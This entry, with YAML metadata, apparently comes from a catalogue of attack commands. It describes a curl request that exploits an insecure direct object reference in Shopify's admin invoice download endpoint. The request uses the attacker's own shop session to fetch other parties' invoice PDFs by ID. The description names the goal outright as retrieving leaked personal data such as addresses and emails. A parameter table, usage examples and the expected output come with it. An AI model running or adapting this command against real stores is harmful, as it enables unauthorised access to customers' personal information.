---
data: >
  curl -X GET
  "https://admin.shopify.com/store/[yourshop]/invoices/[theid]/download.html?document_type=INVOICE"
  -H "Cookie: [redacted]" --output leaked_invoice.pdf

  output: null

  created_at: "2023-10-01T00:00:00Z"

  updated_at: "2023-10-01T00:00:00Z"

  platforms: ["Web"]

  tags: ["download", "pdf", "idor"]
tags:
  - download
  - pdf
  - idor
  - shopify
type: command
output: null
executor: bash
platforms:
  - Web
id: 5536b242-ad9b-4e56-8d70-d20f3c9162b8
created_at: '2025-12-14T17:26:00.211Z'
updated_at: '2025-12-14T17:26:00.211Z'
verified: false
validated: true
submitted: true
---
# shopify-invoice-pdf-download

## Command

```bash
curl -X GET "https://admin.shopify.com/store/[yourshop]/invoices/[theid]/download.html?document_type=INVOICE" -H "Cookie: [redacted]" --output leaked_invoice.pdf
```

## Description

Downloads the PDF invoice for a given ID, retrieving leaked PII from unauthorized documents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| [yourshop] | Attacker's shop domain | Yes |
| [theid] | Invoice ID | Yes |
| document_type | INVOICE or CREDIT_NOTE | Yes |
| Cookie | Auth session | Yes |

## Examples

### Basic Usage

```bash
curl [GET URL] --output pdf
```

### Advanced Usage

```bash
curl [URL] -H "User-Agent: ..." --output pdf
```

## Expected Output

Binary PDF file with embedded leaked data like addresses and emails.

## Related

- [[Related Procedure: Retrieve-Leaked-Invoice-PDF]]
